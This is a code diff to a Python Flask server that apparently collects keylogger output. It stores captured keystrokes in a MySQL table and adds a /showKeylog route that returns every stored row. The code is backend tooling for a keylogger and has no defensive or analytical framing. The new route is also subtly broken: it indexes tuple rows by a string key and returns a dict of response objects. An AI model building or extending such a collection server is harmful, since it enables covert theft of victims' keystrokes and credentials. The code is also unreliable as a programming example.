@@ -5,7 +5,7 @@ import mysql.connector
 import os
 
 #start flask app
-app = Flask(__name__, template_folder='static')
+app = Flask(__name__, template_folder='templates')
 
 #load the configurations from json file
 def load_cfg(path):
@@ -39,7 +39,6 @@ def addLog():
   return make_response(jsonify({'response': 'Success', 'code':200}), 200)
 
 
-
 def pushDB(payload):
   main_cfg = load_cfg('./main_cfg.json')
 
@@ -61,6 +60,31 @@ def pushDB(payload):
   db.commit()
   return 0 
 
+@app.route('/showKeylog', methods=['GET'])
+def showKeylog():
+  main_cfg = load_cfg('./main_cfg.json')
+  res = {}
+
+  db = mysql.connector.connect (
+    host=main_cfg['dbHost'],
+    port=main_cfg['port'],
+    user=main_cfg['sqlUser'],
+    password=main_cfg['sqlPass'],
+    database=main_cfg['db']
+  )
+  
+  mycursor = db.cursor()
+  
+  sql = f"SELECT * FROM {main_cfg['dbTable']}"
+  mycursor.execute(sql)
+  rows = mycursor.fetchall()
+  
+  for row in rows:
+    res[row["id"]] = make_response(jsonify(row))
+  
+  return res
+  
+  
 
 if __name__ == "__main__":
     # app.run(host="0.0.0.0", port=int("443"), debug=True)
